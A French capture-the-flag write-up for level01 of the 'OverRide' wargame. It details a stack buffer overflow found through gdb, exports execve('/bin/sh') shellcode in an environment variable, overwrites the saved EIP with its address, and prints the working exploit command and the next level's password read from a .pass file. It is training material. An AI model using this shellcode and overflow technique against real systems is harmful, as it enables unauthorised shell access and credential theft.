 
 1 ---- OBJECTIF
        Dans ce niveau nous allons nour servir de la fonction fgets utiliser pour demander le mot de passe a l'utilisateur
        la particulariter de ce fgets et qu'il nous permet de rentrer jusqu'a 100 caracteres. le stockage du mot de passe se fait dans le main.
        le nombre d'octect entre l'EIP de sortie du main et l'emplacement de stockage du mot de passe etant inferieur a 100 nous allons pouvoir tenter
        de rediriger le flux du programme vers un shellcode system(/bin/sh)


2 --- ARRIVER A LA SAISIE DU USERNAME
        pour arriver jusqu'au fgets il nous faut passer la comparaison d'un premier fgets d'un username.
        et passer un cmpsb entre la valeur rentrer et une autre valeur afin d'arriver au fgets du mot de passe.
        
        On vois ici que la fonction verify_user_name verifie que le username rentre et bien egal a dat_wil en regardant les 7 premiers caractere rentré

        0x08048478 <+20>:	mov    $0x804a040,%edx
        0x0804847d <+25>:	mov    $0x80486a8,%eax
        0x08048482 <+30>:	mov    $0x7,%ecx
        0x08048487 <+35>:	mov    %edx,%esi
        0x08048489 <+37>:	mov    %eax,%edi
        0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)

        (gdb) x 0x804a040
        -->    0x804a040 <a_user_name>:	 "dat_wil\n" (variable globale de l'utilisateur attendu)
        (gdb) x 0x80486a8
        -->    0x80486a8:	 "dat_wil" (adresse du username demander a l'utilisateur)

        il suffit donc de rente dat_wil en username pour arriver a la suite


3 --- ARRIVER A LA SAISIE DU MOT DE PASSE
        ********* ADMIN LOGIN PROMPT *********
        Enter Username: dat_will
        verifying username....

        Enter Password:
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

        Breakpoint 1, 0x08048579 in main ()

        (gdb) x/44 $esp
        0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
        0xffffd690:	0xffffd8ac	0x0000002f	0xffffd6ec	0x41414141 <-- buffer start
        0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
        0xffffd6b0:	0x41414141	0x41414141	0x000a4141	0x00000000
        0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
        0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
        0xffffd6e0:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513 <-- EIP

        Stack frame du main apres la saisie de plusieur `A` en tant que mot de passe

        En regardant la memoire apres la saisie du mot de passe on peu en deduire le nombre de caractere a rentrer
        pour remplacer EIP et ainsi changer le cours du programme. (80 caractere + 4 de remplacement de l'EIP)


4 --- EXPLOITATION DE LA FAILLE
        A partir de ce moment la on va exporter un shellcode lancan la commande /bin/sh

        export SHELLCODE=`python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`

        (gdb) x/s *((char **) environ)
        0xffffd88d:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
        (gdb) x 0xffffd89d
        0xffffd89d:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"

        son addresse : 0xffffd89d

        commande a taper pour ouvir le shell :
        cat <(echo "dat_wil") <(python -c 'print("A" * 80 + "\x9d\xd8\xff\xff")') - | ./level01


        level01@OverRide:~$ cat <(echo "dat_wil") <(python -c 'print("A" * 80 + "\x9d\xd8\xff\xff")') - | ./level01
        ********* ADMIN LOGIN PROMPT *********
        Enter Username: verifying username....

        Enter Password:
        nope, incorrect password...

        cat /home/users/level02/.pass
        PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv


5 --- OBTENIR LE TOKEN
export SHELLCODE=`python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
cat <(echo "dat_wil") <(python -c 'print("A" * 80 + "\x9d\xd8\xff\xff")') - | ./level01
cat /home/users/level02/.pass